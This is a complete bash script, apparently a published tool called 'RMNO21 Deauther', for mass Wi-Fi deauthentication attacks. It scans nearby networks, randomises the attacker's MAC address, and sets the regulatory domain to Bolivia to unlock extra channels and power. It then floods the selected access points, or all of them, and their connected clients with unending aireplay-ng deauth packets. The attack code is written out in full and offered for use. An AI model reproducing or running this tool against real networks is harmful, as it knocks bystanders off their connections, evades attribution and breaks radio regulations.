#!/bin/bash

# Configuration
SCAN_TIME=20          # Duration of network scan in seconds
ATTACK_DELAY=25       # Duration of attack per channel in seconds
DEAUTH_STRENGTH=0     # 0 means infinite packets (continuous jamming)

# ANSI Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# Global variables
INTERFACE=""
ORIGINAL_MAC=""
ORIGINAL_IFACE=""
TARGET_NETWORKS=()

# -------------------
# Function Definitions
# -------------------

# Display Banner
print_banner() {
    clear
    echo -e "${RED}"
    echo " ██████╗ ███╗   ███╗███╗   ██╗ ██████╗ ██████╗  ██╗    ██████╗ ███████╗ █████╗ ██╗   ██╗████████╗██╗  ██╗███████╗██████╗ "
    echo " ██╔══██╗████╗ ████║████╗  ██║██╔═══██╗╚════██╗███║    ██╔══██╗██╔════╝██╔══██╗██║   ██║╚══██╔══╝██║  ██║██╔════╝██╔══██╗ "
    echo " ██████╔╝██╔████╔██║██╔██╗ ██║██║   ██║ █████╔╝╚██║    ██║  ██║█████╗  ███████║██║   ██║   ██║   ███████║█████╗  ██████╔╝ "
    echo " ██╔══██╗██║╚██╔╝██║██║╚██╗██║██║   ██║██╔═══╝  ██║    ██║  ██║██╔══╝  ██╔══██║██║   ██║   ██║   ██╔══██║██╔══╝  ██╔══██╗ "
    echo " ██║  ██║██║ ╚═╝ ██║██║ ╚████║╚██████╔╝███████╗ ██║    ██████╔╝███████╗██║  ██║╚██████╔╝   ██║   ██║  ██║███████╗██║  ██║ "
    echo " ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ "
    echo -e "${NC}"
    echo -e "${CYAN}                  High-Performance Deauthentication Tool | 5GHz Ready | Massive Multi-Targeting${NC}"
    echo -e "${BLUE}                                  https://github.com/RMNO21${NC}"
    echo ""
}

# Cleanup and exit handler
cleanup() {
    echo -e "\n\n${RED}[!] Exiting...${NC}"
    echo -e "${YELLOW}[*] Stopping all background processes...${NC}"
    pkill -9 aireplay-ng &> /dev/null
    pkill -9 airodump-ng &> /dev/null

    if [ -n "$INTERFACE" ]; then
        echo -e "${YELLOW}[*] Disabling monitor mode on $INTERFACE...${NC}"
        airmon-ng stop "$INTERFACE" &> /dev/null
    fi

    if [ -n "$ORIGINAL_MAC" ] && [ -n "$ORIGINAL_IFACE" ]; then
        echo -e "${YELLOW}[*] Restoring original MAC address...${NC}"
        ifconfig "$ORIGINAL_IFACE" down
        macchanger --mac="$ORIGINAL_MAC" "$ORIGINAL_IFACE" &> /dev/null
        ifconfig "$ORIGINAL_IFACE" up
    fi

    echo -e "${YELLOW}[*] Restarting NetworkManager...${NC}"
    systemctl restart NetworkManager &> /dev/null

    rm -f /tmp/aireplay_pid_*.txt
    rm -f scan_results-*.csv
    rm -f networks.txt
    
    echo -e "${GREEN}[+] Done. Stay safe.${NC}"
    exit 0
}

# Check root privileges
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] This script must be run as root. Use sudo.${NC}"
        exit 1
    fi
}

# Validate wireless interface
select_interface() {
    print_banner
    echo -e "${BOLD}[*] Available wireless interfaces:${NC}"
    INTERFACES=$(iw dev | awk '$1=="Interface"{print $2}')
    
    if [ -z "$INTERFACES" ]; then
        echo -e "${RED}[!] No wireless interfaces found. Exiting.${NC}"
        exit 1
    fi

    index=1
    declare -A INTERFACE_MAP
    for iface in $INTERFACES; do
        INTERFACE_MAP[$index]="$iface"
        echo -e "${GREEN}[$index]${NC} $iface"
        ((index++))
    done

    echo ""
    read -p "Select interface (number): " IFACE_INDEX
    INTERFACE=${INTERFACE_MAP[$IFACE_INDEX]}
    
    if [ -z "$INTERFACE" ]; then
        echo -e "${RED}[!] Invalid selection. Exiting.${NC}"
        exit 1
    fi
}

# Handle MAC address spoofing
spoof_mac() {
    ORIGINAL_IFACE=$INTERFACE
    echo -e "${YELLOW}[+] Saving original MAC address...${NC}"
    ORIGINAL_MAC=$(macchanger -s "$INTERFACE" | grep -o -E '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}')
    
    echo -e "${YELLOW}[+] Changing MAC address...${NC}"
    ifconfig "$INTERFACE" down
    macchanger -r "$INTERFACE" &> /dev/null
    ifconfig "$INTERFACE" up
    
    NEW_MAC=$(macchanger -s "$INTERFACE" | grep -o -E '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}')
    echo -e "${GREEN}[+] MAC changed from $ORIGINAL_MAC to $NEW_MAC${NC}"
}

# Enable monitor mode
enable_monitor_mode() {
    echo -e "${BOLD}[*] Enabling monitor mode on $INTERFACE...${NC}"
    
    # Unlock 5GHz channels and high power
    echo -e "${GREEN}[+] Setting regulatory domain to Bolivia (High Power/All Channels)...${NC}"
    iw reg set BO &> /dev/null
    sleep 1

    airmon-ng check kill &> /dev/null
    airmon-ng start "$INTERFACE" &> /dev/null
    
    # Verify monitor mode
    sleep 2
    local new_iface=$(airmon-ng | grep "$INTERFACE" | awk '{print $2}')
    
    # Check if interface name changed to *mon* OR if it is in monitor mode
    local mode=$(iw dev "$new_iface" info 2>/dev/null | grep "type" | awk '{print $2}')
    
    if [[ "$new_iface" == *"mon"* ]] || [[ "$mode" == "monitor" ]]; then
        if [ -n "$new_iface" ]; then
             INTERFACE="$new_iface"
        fi
        echo -e "${GREEN}[+] Monitor mode enabled on $INTERFACE${NC}"
    else
        echo -e "${RED}[!] Failed to enable monitor mode. 'airmon-ng start' failed or interface not found.${NC}"
        exit 1
    fi
}

# Auto-detect optimal parameters based on network density
auto_detect_params() {
    # We do NOT override the top configuration variables here anymore.
    # We only report the network density for information purposes.
    
    NETWORK_COUNT=$(wc -l < networks.txt)
    NETWORK_COUNT=$((NETWORK_COUNT - 2)) # Subtract header lines

    echo -e "${YELLOW}[*] Network Density Analysis:${NC}"
    echo -e "    - Detected Networks: ${BOLD}$NETWORK_COUNT${NC}"
    echo -e "    - Attack Delay:      ${BOLD}Dynamic (1s per AP)${NC}"
    echo -e "    - Deauth Strength:   ${BOLD}Infinite${NC} (Continuous)"
    
    echo -e "${GREEN}[+] Optimization complete.${NC}"
    sleep 2
}

# Scan for networks
scan_networks() {
    clear
    print_banner
    echo -e "${BOLD}[*] Starting network scan for ${SCAN_TIME} seconds...${NC}"
    echo -e "${YELLOW}    (Press Ctrl+C to stop scanning early)${NC}"
    
    # Remove old files
    rm -f scan_results-*.csv networks.txt

    # Start airodump-ng in background
    airodump-ng --output-format csv --write scan_results "$INTERFACE" &> /dev/null &
    AIRODUMP_PID=$!
    
    # Show progress bar
    for ((i=1; i<=SCAN_TIME; i++)); do
        PERCENT=$((i * 100 / SCAN_TIME))
        BAR_LEN=$((PERCENT / 2))
        BAR=$(printf "%${BAR_LEN}s" | tr ' ' '#')
        echo -ne "\r${CYAN}[Scanning] [${BAR:0:50}] ${PERCENT}%${NC}"
        sleep 1
    done
    echo ""
    
    kill "$AIRODUMP_PID" &> /dev/null
    wait "$AIRODUMP_PID" 2>/dev/null
    
    # Parse results
    echo -e "${YELLOW}[*] Parsing scan results...${NC}"
    if [ ! -f scan_results-01.csv ]; then
        echo -e "${RED}[!] No scan results found. Retrying...${NC}"
        scan_networks
        return
    fi
    
    # Build a clean CSV of APs only with numeric channels
    # Columns: row,essid,bssid,channel,privacy
    echo "row,essid,bssid,channel,privacy" > networks.csv
    awk -F',' '
    BEGIN { row=1 }
    $1=="BSSID" { next }          # skip header
    /^$/ { exit }                 # stop at blank line before Station section
    {
        bssid=$1; gsub(/^[ \t]+|[ \t]+$/, "", bssid);
        channel=$4; gsub(/^[ \t]+|[ \t]+$/, "", channel);
        privacy=$6; gsub(/^[ \t]+|[ \t]+$/, "", privacy);
        essid=$14; sub(/^ /, "", essid);
        if (essid=="") essid="<hidden>";
        if (bssid ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/) {
            if (channel ~ /^[0-9]+$/ && channel != "-1") {
                printf("%d,%s,%s,%s,%s\n", row, essid, bssid, channel, privacy);
                row++;
            }
        }
    }
    ' scan_results-01.csv >> networks.csv
    
    # Pretty text table for display
    echo -e "${BOLD}\nScan Complete.${NC}"
    printf "${BOLD}%-3s %-30s %-17s %-4s %-10s${NC}\n" "ID" "ESSID" "BSSID" "CH" "ENC"
    echo "--------------------------------------------------------------------------" > networks.txt
    printf "%-3s %-30s %-17s %-4s %-10s\n" "ID" "ESSID" "BSSID" "CH" "ENC" >> networks.txt
    echo "--------------------------------------------------------------------------" >> networks.txt
    tail -n +2 networks.csv | while IFS=, read -r row essid bssid channel privacy; do
        printf "%-3s %-30s %-17s %-4s %-10s\n" "$row" "$essid" "$bssid" "$channel" "$privacy" >> networks.txt
    done
}

# Select target networks
select_targets() {
    clear
    print_banner
    echo -e "${BOLD}[*] Available networks:${NC}"
    cat networks.txt
    
    echo ""
    read -p "Enter target numbers (comma-separated) or 'all': " TARGET_ROWS

    if [[ "$TARGET_ROWS" == "all" ]]; then
        echo -e "${YELLOW}[*] Selecting ALL networks...${NC}"
        # Get all row numbers from networks.csv (skipping header)
        TOTAL_LINES=$(wc -l < networks.csv)
        ROWS=($(seq 1 $((TOTAL_LINES - 1))))
    else
        IFS=',' read -ra ROWS <<< "$TARGET_ROWS"
    fi
    
    for row in "${ROWS[@]}"; do
        LINE=$(grep -E "^${row}," networks.csv)
        if [[ -z "$LINE" ]]; then
            echo -e "${RED}[!] Invalid row: $row${NC}"
            continue
        fi
        
        IFS=, read -r IDX ESSID BSSID CHANNEL PRIVACY <<< "$LINE"
        
        if [[ -n "$BSSID" && -n "$CHANNEL" && -n "$ESSID" ]]; then
            TARGET_NETWORKS+=("$BSSID,$CHANNEL,$ESSID")
        else
            echo -e "${RED}[!] Failed to parse network details for row: $row${NC}"
        fi
    done
    
    if [[ ${#TARGET_NETWORKS[@]} -eq 0 ]]; then
        echo -e "${RED}[!] No valid targets selected. Exiting.${NC}"
        exit 1
    fi
}

# Main attack loop
attack_loop() {
    while true; do
        # Group targets by channel
        declare -A channel_groups

        # Populate channel groups
        for target in "${TARGET_NETWORKS[@]}"; do
            IFS=',' read -r bssid channel essid <<< "$target"
            if [ -z "${channel_groups[$channel]}" ]; then
                channel_groups[$channel]="$target"
            else
                channel_groups[$channel]="${channel_groups[$channel]}|$target"
            fi
        done

        # Iterate through each channel group
        for channel in "${!channel_groups[@]}"; do
            targets="${channel_groups[$channel]}"

            # Start simultaneous attacks on this channel
            IFS='|' read -ra TARGET_LIST <<< "$targets"
            
            # Calculate dynamic duration based on target count (1 second per AP)
            TARGET_COUNT=${#TARGET_LIST[@]}
            # Minimum 1 second, but scale up with targets if needed.
            # User request: "delay 1 second for every ap"
            CURRENT_DURATION=$((TARGET_COUNT * 1))
            if [ "$CURRENT_DURATION" -lt 1 ]; then CURRENT_DURATION=1; fi

            # Dashboard Display
            clear
            print_banner
            echo -e "${RED}${BOLD}                       >>> ATTACK IN PROGRESS <<<                       ${NC}"
            echo -e "${YELLOW}------------------------------------------------------------------------${NC}"
            echo -e "${BOLD}Current Channel:${NC} $channel"
            echo -e "${BOLD}Target Count:${NC}    $TARGET_COUNT"
            echo -e "${BOLD}Attack Duration:${NC} ${CURRENT_DURATION}s"
            echo -e "${BOLD}Target Group:${NC}    $targets"
            echo -e "${YELLOW}------------------------------------------------------------------------${NC}"
            
            iw dev "$INTERFACE" set channel "$channel" &> /dev/null || \
            iwconfig "$INTERFACE" channel "$channel" &> /dev/null
            
            # Double check if channel was set correctly (Crucial for 5GHz)
            CURRENT_CHAN=$(iw dev "$INTERFACE" info | grep channel | awk '{print $2}')
            if [[ "$CURRENT_CHAN" != "$channel" ]]; then
                 # Try harder with ifconfig down/up
                 ifconfig "$INTERFACE" down
                 iw dev "$INTERFACE" set channel "$channel" &> /dev/null
                 ifconfig "$INTERFACE" up
            fi
            
            sleep 1 # Allow time for channel switch

            # Start simultaneous attacks on this channel
            # TARGET_LIST already populated above
            PIDS=()
            
            echo -e "\n${CYAN}[*] Launching mass attack on $TARGET_COUNT targets...${NC}"
            
            for target_info in "${TARGET_LIST[@]}"; do
                IFS=',' read -r bssid _ essid <<< "$target_info"
                
                # 1. Broadcast Deauth (Works on older devices)
                aireplay-ng --deauth "$DEAUTH_STRENGTH" -a "$bssid" "$INTERFACE" -D --ignore-negative-one &> /dev/null &
                PIDS+=($!)

                # 2. Client-Targeted Deauth (Works on newer devices / 5GHz)
                # Parse clients associated with this BSSID from scan results
                CLIENTS=$(grep "$bssid" scan_results-01.csv | grep -o -E '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | grep -v "$bssid")
                
                if [ -n "$CLIENTS" ]; then
                    echo -e "${RED}  -> Targeting AP: $essid ($bssid) + Connected Clients${NC}"
                else
                    echo -e "${RED}  -> Targeting AP: $essid ($bssid)${NC}"
                fi
                
                for client in $CLIENTS; do
                    # Skip broadcast/multicast
                    if [[ "$client" == "FF:FF:FF:FF:FF:FF" ]]; then continue; fi
                    
                    # echo "    -> Hammering Client $client on $essid"
                    aireplay-ng --deauth "$DEAUTH_STRENGTH" -a "$bssid" -c "$client" "$INTERFACE" -D --ignore-negative-one &> /dev/null &
                    PIDS+=($!)
                done
            done

            # Wait for the attack duration
            # Show a progress bar or countdown
            echo ""
            for ((i=1; i<=CURRENT_DURATION; i++)); do
                 echo -ne "\r${YELLOW}[+] Blasting channel $channel... ($i/$CURRENT_DURATION sec)${NC}"
                 sleep 1
            done
            echo ""

            # Kill all background processes for this channel
            for pid in "${PIDS[@]}"; do
                kill "$pid" &> /dev/null
            done
            wait 2>/dev/null
        done

        echo -e "\n${GREEN}[+] Cycle complete. Restarting attacks...${NC}"
        sleep 1
    done
}

# Main execution flow
trap cleanup SIGINT SIGTERM

check_root
select_interface
enable_monitor_mode
spoof_mac
auto_detect_params
scan_networks
select_targets
attack_loop
